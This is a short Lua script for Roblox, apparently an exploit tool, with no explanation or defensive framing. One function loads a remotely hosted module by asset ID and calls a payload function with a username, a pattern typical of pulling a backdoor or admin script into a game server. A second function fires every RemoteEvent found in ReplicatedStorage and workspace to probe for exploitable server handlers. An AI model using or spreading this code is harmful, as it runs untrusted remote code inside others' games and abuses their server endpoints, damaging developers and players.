function scrip7()
	local success, result = pcall(function()
		return require(89920926905875).getyourfreakout("Ms_Lambda")
	end)
	if not success then
		warn("Failed to require module:", result)
	end
	return result
end

function fireremotes(root)
	for _, v in pairs(root:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			v:FireServer()
			print("Remote: "..v.Name.." Parent: "..v.Parent:GetFullName())
		end
	end
end

fireremotes(game.ReplicatedStorage)
fireremotes(workspace)
